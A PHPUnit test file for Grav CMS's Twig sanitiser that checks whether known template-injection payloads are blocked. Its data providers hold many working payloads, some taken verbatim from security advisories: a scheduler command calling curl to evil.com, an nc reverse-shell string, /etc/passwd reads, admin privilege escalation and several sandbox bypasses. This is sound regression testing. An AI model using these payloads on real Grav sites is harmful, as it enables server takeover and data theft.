<?php

use Grav\Common\Security;

/**
 * Class CleanDangerousTwigTest
 *
 * Tests for Security::cleanDangerousTwig() method.
 * Covers SSTI sandbox fixes: GHSA-662m, GHSA-858q, GHSA-8535, GHSA-gjc5, GHSA-52hh
 *
 * Naming convention: test{Method}_{GHSA_ID}_{description}
 */
class CleanDangerousTwigTest extends \PHPUnit\Framework\TestCase
{
    /**
     * Reset static cache before each test to ensure clean state
     */
    protected function setUp(): void
    {
        parent::setUp();
        // Reset the static pattern cache using reflection
        $reflection = new ReflectionClass(Security::class);

        $properties = [
            'dangerousTwigCompiled',
            'dangerousTwigCacheKey',
            'twigLogSeen',
        ];

        foreach ($properties as $prop) {
            if ($reflection->hasProperty($prop)) {
                $property = $reflection->getProperty($prop);
                $property->setAccessible(true);
                $property->setValue(null, $prop === 'twigLogSeen' ? [] : null);
            }
        }

        // This test file validates the regex filter's rewrite behavior specifically.
        // With the Twig sandbox enabled (the default), cleanDangerousTwig demotes to
        // log-only — correct at runtime but not what these tests measure. Force the
        // sandbox off so the regex filter is the active enforcement layer here.
        $grav = \Grav\Common\Grav::instance();
        if ($grav->offsetExists('config')) {
            $grav['config']->set('security.twig_sandbox.enabled', false);
            // Also disable filter-side logging here so we don't hit the log.security
            // channel from unit tests (the tests are measuring rewrite output, not log side effects).
            $grav['config']->set('security.twig_filter.logging', false);
        }
    }

    protected function tearDown(): void
    {
        // Restore defaults so subsequent test classes see the shipped config.
        $grav = \Grav\Common\Grav::instance();
        if ($grav->offsetExists('config')) {
            $grav['config']->set('security.twig_sandbox.enabled', true);
            $grav['config']->set('security.twig_filter.logging', true);
        }
        parent::tearDown();
    }

    // =========================================================================
    // GHSA-662m-56v4-3r8f: SSTI sandbox bypass via nested evaluate_twig
    // =========================================================================

    /**
     * @dataProvider providerGHSA662m_NestedEvaluateTwig
     */
    public function testCleanDangerousTwig_GHSA662m_BlocksNestedEvaluateTwig(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerGHSA662m_NestedEvaluateTwig(): array
    {
        return [
            ['{{ evaluate_twig("test") }}', 'Direct evaluate_twig call'],
            ['{% set x = evaluate_twig(user_input) %}', 'evaluate_twig in set block'],
            ['{{ evaluate("test") }}', 'evaluate function'],
            ['{{ evaluate_twig(form.value("name")) }}', 'evaluate_twig with form value'],
        ];
    }

    // =========================================================================
    // GHSA-858q-77wx-hhx6: Privilege escalation via grav.user/scheduler
    // =========================================================================

    /**
     * @dataProvider providerGHSA858q_PrivilegeEscalation
     */
    public function testCleanDangerousTwig_GHSA858q_BlocksPrivilegeEscalation(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerGHSA858q_PrivilegeEscalation(): array
    {
        return [
            // User modification attacks
            ["{{ grav.user.update({'access':{'admin':{'super':true}}}) }}", 'grav.user.update privilege escalation'],
            ['{{ grav.user.save() }}', 'grav.user.save call'],

            // Scheduler RCE attacks
            ['{{ grav.scheduler.addCommand("curl", ["http://evil.com"]) }}', 'scheduler.addCommand'],
            ['{{ grav.scheduler.run() }}', 'scheduler.run'],
            ['{{ grav.scheduler.save() }}', 'scheduler.save'],
            ['{% set s = grav.scheduler %}', 'Direct scheduler access'],
        ];
    }

    // =========================================================================
    // GHSA-8535-hvm8-2hmv: Context leak via _context access
    // =========================================================================

    /**
     * @dataProvider providerGHSA8535_ContextLeak
     */
    public function testCleanDangerousTwig_GHSA8535_BlocksContextLeak(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerGHSA8535_ContextLeak(): array
    {
        return [
            ['{{ _context }}', 'Direct _context access'],
            ['{{ _context|json_encode }}', '_context with filter'],
            ['{% for key, value in _context %}{{ key }}{% endfor %}', '_context iteration'],
            ['{{ _self }}', '_self access'],
            ['{{ _charset }}', '_charset access'],
            ['{{ dump(_context) }}', 'dump with _context'],
        ];
    }

    // =========================================================================
    // GHSA-gjc5-8cfh-653x: Sandbox bypass via config.set
    // =========================================================================

    /**
     * @dataProvider providerGHSAgjc5_ConfigBypass
     */
    public function testCleanDangerousTwig_GHSAgjc5_BlocksConfigBypass(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerGHSAgjc5_ConfigBypass(): array
    {
        return [
            ["{{ grav.config.set('system.twig.safe_functions', ['system']) }}", 'grav.config.set safe_functions'],
            ["{{ grav.twig.twig_vars['config'] }}", 'twig_vars config access'],
            ['{{ twig_vars["config"] }}', 'Direct twig_vars access'],
            ["{{ something.safe_functions }}", '.safe_functions access'],
            ["{{ something.safe_filters }}", '.safe_filters access'],
            ["{{ x.undefined_functions }}", '.undefined_functions access'],
        ];
    }

    // =========================================================================
    // GHSA-52hh-vxfw-p6rg: CVE-2024-28116 bypass via string concatenation
    // =========================================================================

    /**
     * @dataProvider providerGHSA52hh_StringConcatBypass
     */
    public function testCleanDangerousTwig_GHSA52hh_BlocksStringConcatBypass(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerGHSA52hh_StringConcatBypass(): array
    {
        // These test the specific suspicious fragments we check for in join() operations
        return [
            ["{{ ['safe_func', 'tions']|join('') }}", 'join to construct safe_functions'],
            ["{{ ['safe_filt', 'ers']|join }}", 'join to construct safe_filters'],
            ["{{ ['_context', 'var']|join('') }}", 'join with _context fragment'],
            ["{{ ['scheduler', '.run']|join('') }}", 'join with scheduler fragment'],
            ["{{ ['registerUndefined', 'Callback']|join('') }}", 'join with registerUndefined fragment'],
            ["{{ ['undefined_', 'functions']|join('') }}", 'join with undefined_ fragment'],
        ];
    }

    // =========================================================================
    // Dangerous PHP Functions (Code Execution)
    // =========================================================================

    /**
     * @dataProvider providerDangerousCodeExecution
     */
    public function testCleanDangerousTwig_BlocksCodeExecution(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerDangerousCodeExecution(): array
    {
        return [
            ['{{ exec("whoami") }}', 'exec function'],
            ['{{ shell_exec("ls") }}', 'shell_exec function'],
            ['{{ system("id") }}', 'system function'],
            ['{{ passthru("cat /etc/passwd") }}', 'passthru function'],
            ['{{ popen("nc -e /bin/sh", "r") }}', 'popen function'],
            ['{{ proc_open("sh", [], $pipes) }}', 'proc_open function'],
            ['{{ pcntl_exec("/bin/sh") }}', 'pcntl_exec function'],
            ['{{ eval("phpinfo();") }}', 'eval function'],
            ['{{ assert("system(\'id\')") }}', 'assert function'],
            ['{{ create_function("", "system(\'id\');") }}', 'create_function'],
        ];
    }

    // =========================================================================
    // Dangerous PHP Functions (File Operations)
    // =========================================================================

    /**
     * @dataProvider providerDangerousFileOperations
     */
    public function testCleanDangerousTwig_BlocksFileOperations(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerDangerousFileOperations(): array
    {
        return [
            ['{{ file_get_contents("/etc/passwd") }}', 'file_get_contents'],
            ['{{ file_put_contents("/tmp/x", "data") }}', 'file_put_contents'],
            ['{{ fopen("/etc/passwd", "r") }}', 'fopen'],
            ['{{ readfile("/etc/passwd") }}', 'readfile'],
            ['{{ unlink("/important/file") }}', 'unlink'],
            ['{{ rmdir("/important/dir") }}', 'rmdir'],
            ['{{ mkdir("/tmp/evil") }}', 'mkdir'],
            ['{{ chmod("/tmp/file", 0777) }}', 'chmod'],
            ['{{ copy("/etc/passwd", "/tmp/passwd") }}', 'copy'],
            ['{{ rename("/tmp/a", "/tmp/b") }}', 'rename'],
            ['{{ symlink("/etc/passwd", "/tmp/link") }}', 'symlink'],
            ['{{ glob("/etc/*") }}', 'glob'],
        ];
    }

    // =========================================================================
    // Dangerous PHP Functions (Network/SSRF)
    // =========================================================================

    /**
     * @dataProvider providerDangerousNetwork
     */
    public function testCleanDangerousTwig_BlocksNetworkFunctions(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerDangerousNetwork(): array
    {
        return [
            ['{{ curl_init("http://evil.com") }}', 'curl_init'],
            ['{{ curl_exec($ch) }}', 'curl_exec'],
            ['{{ fsockopen("evil.com", 80) }}', 'fsockopen'],
            ['{{ pfsockopen("evil.com", 80) }}', 'pfsockopen'],
            ['{{ socket_create(AF_INET, SOCK_STREAM, 0) }}', 'socket_create'],
            ['{{ stream_socket_client("tcp://evil.com:80") }}', 'stream_socket_client'],
        ];
    }

    // =========================================================================
    // Dangerous PHP Functions (Information Disclosure)
    // =========================================================================

    /**
     * @dataProvider providerInfoDisclosure
     */
    public function testCleanDangerousTwig_BlocksInfoDisclosure(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerInfoDisclosure(): array
    {
        return [
            ['{{ phpinfo() }}', 'phpinfo'],
            ['{{ getenv("DB_PASSWORD") }}', 'getenv'],
            ['{{ get_defined_vars() }}', 'get_defined_vars'],
            ['{{ get_defined_functions() }}', 'get_defined_functions'],
            ['{{ ini_get("open_basedir") }}', 'ini_get'],
            ['{{ php_uname() }}', 'php_uname'],
            ['{{ phpversion() }}', 'phpversion'],
        ];
    }

    // =========================================================================
    // Twig Environment Manipulation
    // =========================================================================

    /**
     * @dataProvider providerTwigEnvironmentManipulation
     */
    public function testCleanDangerousTwig_BlocksTwigEnvironmentManipulation(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerTwigEnvironmentManipulation(): array
    {
        return [
            ['{{ grav.twig.twig.registerUndefinedFunctionCallback("system") }}', 'registerUndefinedFunctionCallback'],
            ['{{ twig.twig }}', 'Direct twig.twig access'],
            ['{{ grav.twig.twig }}', 'grav.twig.twig access'],
            ['{{ twig.getFunction("x") }}', 'twig.getFunction'],
            ['{{ twig.addFunction(func) }}', 'twig.addFunction'],
            ['{{ twig.setLoader(loader) }}', 'twig.setLoader'],
            ['{{ core.setEscaper("html", callback) }}', 'core.setEscaper'],
        ];
    }

    // =========================================================================
    // Serialization (Object Injection)
    // =========================================================================

    /**
     * @dataProvider providerSerialization
     */
    public function testCleanDangerousTwig_BlocksSerialization(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerSerialization(): array
    {
        return [
            ['{{ unserialize(user_input) }}', 'unserialize'],
            ['{{ serialize(object) }}', 'serialize'],
            ['{{ var_export(data, true) }}', 'var_export'],
        ];
    }

    // =========================================================================
    // Callback Functions
    // =========================================================================

    /**
     * @dataProvider providerCallbackFunctions
     */
    public function testCleanDangerousTwig_BlocksCallbackFunctions(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerCallbackFunctions(): array
    {
        return [
            ['{{ call_user_func("system", "id") }}', 'call_user_func'],
            ['{{ call_user_func_array("system", ["id"]) }}', 'call_user_func_array'],
            ['{{ array_map("system", ["id"]) }}', 'array_map with callback'],
            ['{{ array_filter(arr, "system") }}', 'array_filter with callback'],
            ['{{ usort(arr, "system") }}', 'usort with callback'],
        ];
    }

    // =========================================================================
    // Grav-specific Dangerous Access
    // =========================================================================

    /**
     * @dataProvider providerGravDangerousAccess
     */
    public function testCleanDangerousTwig_BlocksGravDangerousAccess(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringContainsString('{# BLOCKED:', $result, "Failed to block: $description");
    }

    public static function providerGravDangerousAccess(): array
    {
        return [
            ['{{ grav.backups }}', 'grav.backups access'],
            ['{{ grav.gpm }}', 'grav.gpm access'],
            ['{{ grav.plugins.get("admin") }}', 'grav.plugins.get'],
            ['{{ grav.themes.get("quark") }}', 'grav.themes.get'],
            ['{{ session.set("admin", true) }}', 'session.set'],
            ['{{ cache.clear() }}', 'cache.clear'],
            ['{{ cache.delete("key") }}', 'cache.delete'],
            ['{{ obj.setProperty("key", "value") }}', 'setProperty'],
            ['{{ obj.setNestedProperty("a.b", "c") }}', 'setNestedProperty'],
            ['{{ grav.locator.findResource("user://", true) }}', 'findResource write mode'],
        ];
    }

    // =========================================================================
    // Performance: Early Exit Tests
    // =========================================================================

    public function testCleanDangerousTwig_EarlyExitEmptyString(): void
    {
        $result = Security::cleanDangerousTwig('');
        self::assertSame('', $result);
    }

    public function testCleanDangerousTwig_EarlyExitNoTwigBlocks(): void
    {
        $plainText = 'This is just plain text without any Twig syntax.';
        $result = Security::cleanDangerousTwig($plainText);
        self::assertSame($plainText, $result, 'Plain text should pass through unchanged');
    }

    public function testCleanDangerousTwig_EarlyExitHtmlOnly(): void
    {
        $html = '<div class="container"><h1>Hello World</h1><p>Some content here.</p></div>';
        $result = Security::cleanDangerousTwig($html);
        self::assertSame($html, $result, 'HTML without Twig should pass through unchanged');
    }

    // =========================================================================
    // Safe Patterns (Should NOT be blocked)
    // =========================================================================

    /**
     * @dataProvider providerSafePatterns
     */
    public function testCleanDangerousTwig_AllowsSafePatterns(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringNotContainsString('{# BLOCKED:', $result, "Should NOT block: $description");
    }

    public static function providerSafePatterns(): array
    {
        return [
            ['{{ page.title }}', 'Page title access'],
            ['{{ page.content }}', 'Page content access'],
            ['{{ grav.config.get("site.title") }}', 'Config get (read only)'],
            ['{{ uri.path }}', 'URI path'],
            ['{% for item in collection %}{{ item.title }}{% endfor %}', 'Normal loop'],
            ['{{ "hello"|upper }}', 'String filter'],
            ['{{ date("Y-m-d") }}', 'Date function'],
            ['{{ dump(page) }}', 'Dump for debugging'],
            ['{% if page.visible %}show{% endif %}', 'Conditional'],
            ['{{ page.media.images }}', 'Media access'],
            ['{{ grav.version }}', 'Grav version'],
            ['{{ page.route }}', 'Page route'],
        ];
    }

    // =========================================================================
    // Pattern Caching Tests
    // =========================================================================

    public function testCleanDangerousTwig_PatternCaching(): void
    {
        // First call should build patterns
        $result1 = Security::cleanDangerousTwig('{{ exec("test") }}');

        // Second call should use cached patterns
        $result2 = Security::cleanDangerousTwig('{{ system("test") }}');

        // Both should be blocked
        self::assertStringContainsString('{# BLOCKED:', $result1);
        self::assertStringContainsString('{# BLOCKED:', $result2);

        // Verify compiled pattern set is cached using reflection
        $reflection = new ReflectionClass(Security::class);
        $property = $reflection->getProperty('dangerousTwigCompiled');
        $property->setAccessible(true);
        $cached = $property->getValue();

        self::assertIsArray($cached, 'Compiled patterns should be cached after first call');
        self::assertArrayHasKey('functions', $cached);
        self::assertNotNull($cached['functions'], 'Functions pattern should be compiled');
    }

    // =========================================================================
    // False-positive regression tests: property access that includes a dangerous
    // name (but is not a call) must NOT be blocked.
    // =========================================================================

    /**
     * @dataProvider providerPropertyAccessFalsePositives
     */
    public function testCleanDangerousTwig_AllowsPropertyAccessContainingDangerousName(string $input, string $description): void
    {
        $result = Security::cleanDangerousTwig($input);
        self::assertStringNotContainsString('{# BLOCKED:', $result, "Should NOT block property access: $description");
    }

    public static function providerPropertyAccessFalsePositives(): array
    {
        return [
            ['{{ page.header }}', 'page.header property'],
            ['{{ page.header.title }}', 'nested title access under header'],
            ['{{ page.header.link }}', 'nested link access under header'],
            ['{{ page.header.user.mail }}', 'deep mail property access'],
            ['{{ page.header.email }}', 'header with email field (contains "mail")'],
            ['{{ config.header }}', 'config.header property'],
            ['{{ form.mail }}', 'form.mail as property, not call'],
        ];
    }

    // =========================================================================
    // Per-advisory regression coverage. Each PoC is taken verbatim from the
    // getgrav/grav GitHub Security Advisory noted in the method name. A test
    // passing means cleanDangerousTwig() statically neutralises the PoC's
    // sanitiser-visible primitive (direct call/method/filter form). Advisories
    // whose PoCs construct the dangerous name only at runtime (base64,
    // attribute(grav,'scheduler'), bracket notation) intentionally aren't
    // listed here — see the out-of-scope note below.
    // =========================================================================

    private static function assertPayloadBlocked(string $payload, string $ghsa): void
    {
        $result = Security::cleanDangerousTwig($payload);
        self::assertStringContainsString('{# BLOCKED:', $result, "PoC for $ghsa passed cleanDangerousTwig unchanged");
    }

    public function testCleanDangerousTwig_GHSAphwm_BlocksEvaluateTwigSchedulerChain(): void
    {
        // GHSA-phwm-2fc2-w6x6: evaluate_twig used to schedule arbitrary commands.
        $payload = <<<'TWIG'
{{ evaluate_twig('
  {% set root = constant("GRAV_ROOT") %}
  {% set cmd  = "echo shell" %}
  {% set j    = grav["scheduler"].addCommand("/bin/bash",["-c",cmd]).inForeground() %}
  {% do j.run() %}
  DONE
') }}
TWIG;
        $this->assertPayloadBlocked($payload, 'GHSA-phwm-2fc2-w6x6');
    }

    public function testCleanDangerousTwig_GHSA8rw8_BlocksEvaluateTwigConcatBypass(): void
    {
        // GHSA-8rw8-h8gj-w3p8: evaluate_twig wrapping a concatenated read_file call.
        $payload = <<<'TWIG'
{% set rf = "rea" ~ "d_file" %}
{% set p = "{{ " ~ rf ~ "('/etc/passwd') }}" %}
<pre>{{ evaluate_twig(p) }}</pre>
TWIG;
        $this->assertPayloadBlocked($payload, 'GHSA-8rw8-h8gj-w3p8');
    }

    public function testCleanDangerousTwig_GHSAr2jg_BlocksRegisterUndefinedFilterCallback(): void
    {
        // GHSA-r2jg-9pg4-5rmc: Twig filter callback registration used to reach `system`.
        $payload = <<<'TWIG'
{{ grav.twig.twig.registerUndefinedFilterCallback('system') }}
{{ grav.twig.twig.getFilter('id') }}
TWIG;
        $this->assertPayloadBlocked($payload, 'GHSA-r2jg-9pg4-5rmc');
    }

    /**
     * GHSA-hh7v-cgxv-jcmr / GHSA-r7v4-72r7-hmc8 / GHSA-wxfv-8fr8-x5f9 / GHSA-rmf6-9f5h-xmxh.
     * Closing-brace bypass: the legacy `[^}]*?` based regex could not reach past a `}` inside a
     * string literal. The call-context regex in the refactor matches on the call form itself,
     * so the string-embedded `}` is irrelevant.
     *
     * @dataProvider providerClosingBraceBypass
     */
    public function testCleanDangerousTwig_ClosingBraceBypassRemainsBlocked(string $payload, string $ghsa): void
    {
        $this->assertPayloadBlocked($payload, $ghsa);
    }

    public static function providerClosingBraceBypass(): array
    {
        return [
            ['{{ "}" ~ read_file(\'/etc/passwd\') }}', 'GHSA-hh7v-cgxv-jcmr/r7v4-72r7-hmc8/wxfv-8fr8-x5f9/rmf6-9f5h-xmxh — literal `}` prefix'],
            ['{{ \'}\' ~ read_file(\'/etc/passwd\') }}', 'closing brace with single quotes'],
            ['{{ "}}}"~read_file("/etc/passwd") }}', 'triple closing braces in string'],
        ];
    }

    public function testCleanDangerousTwig_GHSApmp3_BlocksEvaluateTwigSanitizerBypass(): void
    {
        // GHSA-pmp3-wx8f-prrc: evaluate_twig with concat read_file.
        $payload = '{{ evaluate_twig("{{ " ~ "read_" ~ "file(\'/etc/hostname\') }}") }}';
        $this->assertPayloadBlocked($payload, 'GHSA-pmp3-wx8f-prrc');
    }

    /**
     * GHSA-p24r-cqw5-q692 / GHSA-3vw6-hqgq-75v4.
     * Hash-literal bypass of the legacy `[^}]*?` regex. With the call-context regex, the
     * dangerous name's call form is matched regardless of the surrounding hash-literal syntax.
     *
     * @dataProvider providerHashLiteralBypass
     */
    public function testCleanDangerousTwig_HashLiteralBypassRemainsBlocked(string $payload, string $ghsa): void
    {
        $this->assertPayloadBlocked($payload, $ghsa);
    }

    public static function providerHashLiteralBypass(): array
    {
        return [
            ['{% set a = {"x": read_file("/etc/passwd")} %}', 'GHSA-p24r-cqw5-q692/3vw6-hqgq-75v4 — read_file inside hash literal'],
            ['{{ {"a": read_file("/etc/passwd")}|first }}', 'hash-first chain with read_file'],
            ['{% set a = {"x": evaluate_twig("{{ system(\'id\') }}")} %}', 'evaluate_twig inside hash literal'],
        ];
    }

    public function testCleanDangerousTwig_GHSA9cfm_BlocksSafeFunctionsRuntimeOverride(): void
    {
        // GHSA-9cfm-v8p2-4x8f: grav.get("config").set(...) + system("id").
        $payload = <<<'TWIG'
{% set s = "safe" ~ "_functions" %}
{% do grav.get("config").set("system.twig." ~ s, ["system"]) %}
{{ system("id") }}
TWIG;
        $this->assertPayloadBlocked($payload, 'GHSA-9cfm-v8p2-4x8f');
    }

    public function testCleanDangerousTwig_GHSArxxq_BlocksEvaluateConfigMergeChain(): void
    {
        // GHSA-rxxq-77xc-743r: evaluate() with concat read_file.
        $payload = <<<'TWIG'
{% set rf = "read" ~ "_file" %}
{{ evaluate(rf ~ "(\"/etc/passwd\")") }}
TWIG;
        $this->assertPayloadBlocked($payload, 'GHSA-rxxq-77xc-743r');
    }

    /**
     * @dataProvider provider8w8h_EvaluateVariants
     */
    public function testCleanDangerousTwig_GHSA8w8h_BlocksEvaluateFunctions(string $payload, string $description): void
    {
        $this->assertPayloadBlocked($payload, 'GHSA-8w8h-mfjv-j4h9: ' . $description);
    }

    public static function provider8w8h_EvaluateVariants(): array
    {
        return [
            ['{{ evaluate_twig("{{ system(\'id\') }}") }}', 'direct evaluate_twig'],
            ['{{ evaluate("1+1") }}', 'evaluate string form'],
            ['{% set x = evaluate_twig(user_input) %}', 'evaluate_twig in set tag'],
        ];
    }

    /**
     * @dataProvider providerGm2q_PrivEscChain
     */
    public function testCleanDangerousTwig_GHSAgm2q_BlocksGravUserAndSchedulerChain(string $payload, string $description): void
    {
        $this->assertPayloadBlocked($payload, 'GHSA-gm2q-29xq-h25g: ' . $description);
    }

    public static function providerGm2q_PrivEscChain(): array
    {
        return [
            [
                <<<'TWIG'
{% set _ = grav.user.update({
    'access': {'admin': {'login': true, 'super': true}}
}, {}) %}
TWIG,
                'grav.user.update privilege escalation',
            ],
            ['{% set _ = grav.user.save() %}', 'grav.user.save'],
            ["{% set _ = grav.scheduler.addCommand('curl', ['http://localhost:8000']) %}", 'scheduler.addCommand'],
            ['{% set _ = grav.scheduler.save() %}', 'scheduler.save'],
            ['{% set _ = grav.scheduler.run() %}', 'scheduler.run'],
        ];
    }

    /**
     * @dataProvider providerQfv4_TwigArrayMapChain
     */
    public function testCleanDangerousTwig_GHSAqfv4_BlocksTwigArrayMapAndGetFunction(string $payload, string $description): void
    {
        $this->assertPayloadBlocked($payload, 'GHSA-qfv4-q44r-g7rv: ' . $description);
    }

    public static function providerQfv4_TwigArrayMapChain(): array
    {
        return [
            ["{{ grav.twig.twig.getFunction('twig_array_map')|var_dump }}", 'twig.getFunction access'],
            ["{{ twig_array_map(grav.twig.twig, cmd, 'call_user_func')|join }}", 'twig_array_map direct call'],
        ];
    }

    /**
     * @dataProvider providerR6vw_UndefinedCallbackChain
     */
    public function testCleanDangerousTwig_GHSAr6vw_BlocksRegisterUndefinedFunctionCallbackChain(string $payload, string $description): void
    {
        $this->assertPayloadBlocked($payload, 'GHSA-r6vw-8v8r-pmp4: ' . $description);
    }

    public static function providerR6vw_UndefinedCallbackChain(): array
    {
        return [
            ["{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}", 'registerUndefinedFunctionCallback'],
            ["{% set a = grav.config.set('system.twig.undefined_functions', false) %}", 'grav.config.set undefined_functions'],
            ["{{ grav.twig.twig.getFunction('id') }}", 'getFunction retrieval'],
        ];
    }

    /**
     * @dataProvider provider2m7x_SetEscaperChain
     */
    public function testCleanDangerousTwig_GHSA2m7x_BlocksSetEscaperPayloads(string $payload, string $description): void
    {
        $this->assertPayloadBlocked($payload, 'GHSA-2m7x-c7px-hp58: ' . $description);
    }

    public static function provider2m7x_SetEscaperChain(): array
    {
        return [
            ["{{ grav.twig.twig.extensions.core.setEscaper('a', 'a') }}", 'core.setEscaper via extensions.core'],
            ["{{ var_dump(grav.twig.twig.extensions.core.setEscaper('system', 'twig_array_filter')) }}", 'setEscaper rebind to system'],
        ];
    }
}
